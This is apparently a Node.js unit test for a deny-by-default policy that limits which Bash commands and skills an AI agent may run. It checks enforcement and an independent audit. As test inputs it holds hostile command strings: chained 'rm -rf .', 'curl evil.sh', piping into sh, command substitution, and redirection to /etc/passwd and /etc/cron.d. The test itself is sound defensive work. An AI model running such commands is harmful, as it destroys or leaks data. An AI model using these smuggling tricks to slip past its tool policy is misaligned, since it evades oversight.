#!/usr/bin/env node
// test/ux/tool-policy.test.mjs — ZERO-DEPENDENCY unit test for the cockpit's named, deny-by-default
// Bash tool policy (gui/server/tool-policy.mjs). The module is pure, so this runs in PR CI for free.
//
// This is the regression test for the Codex review of PR #40: the previous policy was SUBSTRING
// based, so `node …/firecrawl-extract.mjs <url> ; rm -rf .` was allowed because it *contained* the
// allowed path. The fix is exact-argv matching with shell-metacharacter rejection. We assert both
// the enforcement (`evaluateToolPolicy`) and the judge-independent audit (`auditToolPolicy`) deny
// that chained command.
//
// Run: node test/ux/tool-policy.test.mjs

import {
  evaluateToolPolicy,
  auditToolPolicy,
  tokenizeCommand,
} from "../../gui/server/tool-policy.mjs";

let failed = 0;
const RED = "\x1b[0;31m",
  GREEN = "\x1b[0;32m",
  NC = "\x1b[0m";
function check(label, cond) {
  if (cond) console.log(`  ${GREEN}✓${NC} ${label}`);
  else {
    console.log(`  ${RED}✗${NC} ${label}`);
    failed++;
  }
}

const P = "ux-onboarding";
const FCBIN = "node .claude/skills/firecrawl-direct/firecrawl-extract.mjs";
const SCBIN = "node .claude/skills/workspace-setup/suggest-connectors.mjs";
// The exact documented shapes (workspace-setup/SKILL.md):
const FC = `${FCBIN} --url https://example.com/about --out .aios/onboarding-extract.json`;
const SC = `${SCBIN} --extract .aios/onboarding-extract.json --repo .`;
const allow = (cmd, tool = "Bash") => evaluateToolPolicy(P, tool, cmd).allowed === true;
const deny = (cmd, tool = "Bash") => evaluateToolPolicy(P, tool, cmd).allowed === false;

console.log("policy: inert / unknown-name handling");
{
  const off = evaluateToolPolicy("", "Bash", FC);
  check(
    "empty policy name → inactive (production unchanged)",
    off.active === false && off.allowed === false
  );
  const unknown = evaluateToolPolicy("does-not-exist", "Bash", FC);
  check(
    "unknown policy name → active + denied (fail closed)",
    unknown.active === true && unknown.allowed === false
  );
}

console.log("policy: ALLOW only the exact firecrawl/suggest argv shapes");
{
  check("firecrawl-extract --url + fixed --out (documented shape)", allow(FC));
  check(
    "firecrawl-extract positional URL only (no --out)",
    allow(`${FCBIN} https://example.com/about`)
  );
  check(
    "firecrawl-extract repeated --url",
    allow(`${FCBIN} --url https://a.com --url https://b.com/in/me`)
  );
  check(
    "firecrawl-extract with --repo . (pinned)",
    allow(`${FCBIN} --url https://x.com/a --repo .`)
  );
  check("suggest-connectors --extract fixed + --repo . (documented shape)", allow(SC));
  check(
    "suggest-connectors --extract only (no --repo)",
    allow(`${SCBIN} --extract .aios/onboarding-extract.json`)
  );
}

console.log("policy: accept the ABSOLUTE script path the SDK resolves against cwd");
{
  const ABS = "node /tmp/ux-fixture/.claude/skills/firecrawl-direct/firecrawl-extract.mjs";
  check("absolute path ending in the script allowed", allow(`${ABS} --url https://x/a`));
  check(
    "absolute path + trailing 2>&1 (the real live command) allowed",
    allow(`${ABS} --url https://example.com/about 2>&1`)
  );
  check(
    "path-boundary trick (no '/' before .claude) denied",
    deny("node evil.claude/skills/firecrawl-direct/firecrawl-extract.mjs --url https://x/a")
  );
  check(
    "absolute path but off-policy --out still denied",
    deny(`${ABS} --url https://x/a --out /tmp/x`)
  );
}

console.log("policy: DENY off-shape args (the prefix-match write/read primitive)");
{
  check(
    "THE WRITE PRIMITIVE — firecrawl --out to an arbitrary file",
    deny(`${FCBIN} --url https://x.com/a --out /tmp/policy-writes.json`)
  );
  check(
    "firecrawl --out to a relative non-fixed file",
    deny(`${FCBIN} --url https://x.com/a --out notes.json`)
  );
  check(
    "firecrawl --out absolute system path",
    deny(`${FCBIN} --url https://x.com/a --out /etc/cron.d/x`)
  );
  check(
    "firecrawl --repo to an arbitrary dir (read primitive)",
    deny(`${FCBIN} --url https://x.com/a --repo /tmp`)
  );
  check("firecrawl unknown flag", deny(`${FCBIN} --url https://x.com/a --eval pwned`));
  check("firecrawl non-URL positional arg", deny(`${FCBIN} notaurl`));
  check(
    "firecrawl --out with no value (dangling flag)",
    deny(`${FCBIN} --url https://x.com/a --out`)
  );
  check(
    "firecrawl duplicate --out",
    deny(
      `${FCBIN} --url https://x.com/a --out .aios/onboarding-extract.json --out .aios/onboarding-extract.json`
    )
  );
  check("suggest-connectors without --extract", deny(`${SCBIN} --repo .`));
  check(
    "suggest-connectors --extract to an arbitrary file",
    deny(`${SCBIN} --extract /etc/passwd`)
  );
  check(
    "suggest-connectors --repo to an arbitrary dir",
    deny(`${SCBIN} --extract .aios/onboarding-extract.json --repo /tmp`)
  );
  check(
    "suggest-connectors unknown flag",
    deny(`${SCBIN} --extract .aios/onboarding-extract.json --eval pwned`)
  );
}

console.log("policy: DENY shell metacharacters / chaining (the substring bypass)");
{
  check("THE BYPASS — allowed path then ; rm -rf .", deny(FC + " ; rm -rf ."));
  check("&& chaining after allowed path", deny(FC + " && curl evil.sh"));
  check("pipe after allowed path", deny(FC + " | sh"));
  check(
    "command substitution $()",
    deny("node .claude/skills/firecrawl-direct/firecrawl-extract.mjs $(whoami)")
  );
  check(
    "backtick substitution",
    deny("node .claude/skills/firecrawl-direct/firecrawl-extract.mjs `id`")
  );
  check("output redirection", deny(FC + " > /etc/passwd"));
  check("newline-embedded second command", deny(FC + "\nrm -rf ."));
}

console.log("policy: DENY wrong shape / wrong binary / substring tricks");
{
  check(
    "firecrawl path present but as an ARG to another script (argv[1] mismatch)",
    deny("node evil.mjs --x .claude/skills/firecrawl-direct/firecrawl-extract.mjs")
  );
  check("non-node binary", deny("rm -rf ."));
  check("bash -c wrapping", deny("bash -c node\\ x"));
  check(
    "firecrawl-extract WITHOUT the required URL arg",
    deny("node .claude/skills/firecrawl-direct/firecrawl-extract.mjs")
  );
  check(
    "quoted arg rejected (argv stays unambiguous)",
    deny('node .claude/skills/workspace-setup/suggest-connectors.mjs "a b"')
  );
  check("leading env-assignment rejected", deny("FOO=bar " + SC));
  check(
    "absolute path to a DIFFERENT script name is denied",
    deny("node /tmp/.claude/skills/firecrawl-direct/other.mjs https://x/a")
  );
}

console.log("policy: only Bash + the firecrawl Skill are allowable under a policy");
{
  check("Write tool denied even with an allowed-looking command", deny(FC, "Write"));
  check("WebFetch tool denied", deny(FC, "WebFetch"));
}

console.log("policy: tolerate a trailing 2>&1 (fd-dup), reject every other redirection/chain");
{
  check("firecrawl --url … 2>&1 (the agent's real command) allowed", allow(FC + " 2>&1"));
  check("suggest-connectors … 2>&1 allowed", allow(SC + " 2>&1"));
  check("trailing 2>&1 with extra spaces allowed", allow(FC + "   2>&1  "));
  check("2>&1 THEN a chained command still denied", deny(FC + " 2>&1 ; rm -rf ."));
  check("2>&1 then a pipe still denied", deny(FC + " 2>&1 | sh"));
  check("non-trailing (mid-command) 2>&1 still denied", deny(FCBIN + " 2>&1 --url https://x/a"));
  check("real stderr-to-file redirection still denied", deny(FC + " 2>/tmp/err.log"));
  check("2>/dev/null still denied (only exact trailing 2>&1 tolerated)", deny(FC + " 2>/dev/null"));
}

console.log("policy: allow the firecrawl-direct Skill (structured), deny other skills");
{
  const skill = (skillName, args) =>
    evaluateToolPolicy(P, "Skill", { skill: skillName, args }).allowed;
  check(
    "Skill firecrawl-direct with an http(s) URL allowed",
    skill("firecrawl-direct", "https://example.com/about") === true
  );
  check(
    "Skill firecrawl-direct with array URL arg allowed",
    skill("firecrawl-direct", ["https://example.com/about"]) === true
  );
  check(
    "Skill firecrawl-direct with a non-URL arg denied",
    skill("firecrawl-direct", "not a url") === false
  );
  check(
    "Skill firecrawl-direct with URL + extra token denied",
    skill("firecrawl-direct", "https://x/a evil") === false
  );
  check("a DIFFERENT skill denied", skill("shell-runner", "https://example.com/about") === false);
  check("Skill with empty args denied", skill("firecrawl-direct", "") === false);
}

console.log("audit: re-derives verdicts from raw command (catches recorded drift)");
{
  // Clean transcript: server allowed exactly the firecrawl command → audit ok.
  const clean = [
    { type: "tool_policy", tool: "Bash", command: FC, allowed: true },
    { type: "tool_policy", tool: "Bash", command: "rm -rf .", allowed: false },
  ];
  const a1 = auditToolPolicy(clean, { policyName: P });
  check("clean transcript → audit ok", a1.ok === true);

  // Adversarial: imagine a buggy server that RECORDED allowed:true on a chained command.
  // The audit must still catch it by re-evaluating the raw command (does not trust the flag).
  const drifted = [
    { type: "tool_policy", tool: "Bash", command: FC + " ; rm -rf .", allowed: true },
  ];
  const a2 = auditToolPolicy(drifted, { policyName: P });
  check(
    "recorded allowed:true on chained command → audit FAILS (no drift)",
    a2.ok === false &&
      a2.checks.some((c) => c.name === "no_offlist_command_allowed" && c.ok === false)
  );

  // Firecrawl never requested → audit fails on the "was it exercised" check.
  const noFirecrawl = [{ type: "tool_policy", tool: "Bash", command: SC, allowed: true }];
  const a3 = auditToolPolicy(noFirecrawl, { policyName: P });
  check(
    "firecrawl never requested → audit fails",
    a3.ok === false &&
      a3.checks.some((c) => c.name === "firecrawl_extract_requested" && c.ok === false)
  );

  check(
    "empty/garbage events → audit fails (nothing exercised)",
    auditToolPolicy([], { policyName: P }).ok === false
  );

  // Firecrawl requested via the Skill tool (structured input recorded by the server) → audit ok.
  const viaSkill = [
    {
      type: "tool_policy",
      tool: "Skill",
      command: "",
      input: { skill: "firecrawl-direct", args: "https://example.com/about" },
      allowed: true,
    },
  ];
  check(
    "firecrawl via Skill event → audit ok",
    auditToolPolicy(viaSkill, { policyName: P }).ok === true
  );

  // A non-firecrawl Skill recorded as allowed must be caught as off-list (re-derive denies it).
  const badSkill = [
    {
      type: "tool_policy",
      tool: "Skill",
      command: "",
      input: { skill: "evil", args: "x" },
      allowed: true,
    },
  ];
  const a5 = auditToolPolicy(badSkill, { policyName: P });
  check(
    "allowed non-firecrawl Skill → audit FAILS (off-list)",
    a5.ok === false &&
      a5.checks.some((c) => c.name === "no_offlist_command_allowed" && c.ok === false)
  );

  // The agent's real Bash command (with 2>&1) recorded as allowed → audit still ok.
  const real2 = [{ type: "tool_policy", tool: "Bash", command: FC + " 2>&1", allowed: true }];
  check(
    "real 2>&1 firecrawl command → audit ok",
    auditToolPolicy(real2, { policyName: P }).ok === true
  );

  // The actual live shape: ABSOLUTE path + 2>&1 → audit detects firecrawl + re-verifies.
  const live = [
    {
      type: "tool_policy",
      tool: "Bash",
      command:
        "node /tmp/ux-fixture/.claude/skills/firecrawl-direct/firecrawl-extract.mjs --url https://example.com/about 2>&1",
      allowed: true,
    },
  ];
  check(
    "absolute-path + 2>&1 live command → audit ok",
    auditToolPolicy(live, { policyName: P }).ok === true
  );
}

console.log("tokenizeCommand: low-level behavior");
{
  check(
    "plain command → argv",
    JSON.stringify(tokenizeCommand("node a.mjs x")) === JSON.stringify(["node", "a.mjs", "x"])
  );
  check("metachar → null", tokenizeCommand("node a.mjs ; ls") === null);
  check("quote → null", tokenizeCommand('node a.mjs "x"') === null);
  check("env-assignment prefix → null", tokenizeCommand("A=1 node a.mjs") === null);
  check("non-string → null", tokenizeCommand(42) === null);
  check("empty → null", tokenizeCommand("   ") === null);
}

console.log("");
if (failed) {
  console.log(`${RED}tool-policy.test: ${failed} check(s) failed${NC}`);
  process.exit(1);
}
console.log(`${GREEN}tool-policy.test: all checks passed${NC}`);
